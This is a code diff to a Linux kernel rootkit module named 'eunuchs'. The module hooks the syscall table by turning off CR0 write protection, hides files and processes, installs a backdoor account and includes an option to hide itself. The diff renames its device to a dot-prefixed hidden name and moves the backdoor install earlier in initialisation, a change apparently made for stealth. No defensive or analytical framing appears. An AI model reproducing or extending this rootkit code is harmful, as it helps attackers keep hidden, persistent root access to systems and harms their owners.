@@ -65,8 +65,8 @@
 static unsigned long *sct = 0xc167b180;
 
 /* for our char char device */
-#define EUNUCHS_DEVICE_NAME "eunuchs" /* change the name of the device here if desired */
-#define EUNUCHS_CLASS_NAME "eunuchs"
+#define EUNUCHS_DEVICE_NAME ".eunuchs" /* change the name of the device here if desired */
+#define EUNUCHS_CLASS_NAME ".eunuchs"
 
 /* files that end in this will be hidden by default */
 #define EUNUCHS_DEFAULT_HIDE_EXT ".eunuchs"
@@ -1069,14 +1069,15 @@ static int eunuchs_init(void)
     if(eunuchs_lists_init() == -1)
         return -1;
 
+    /* install backdoor account */
+    eunuchs_install_backdoor();
+
     /* install hooks */
     cr0_enable_write();
     eunuchs_hooks_install();
     process_hide_init();
     cr0_disable_write();
 
-    /* install backdoor account */
-    eunuchs_install_backdoor();
 
     /* hide the module */
     /* eunuchs_hide_lkm(); */
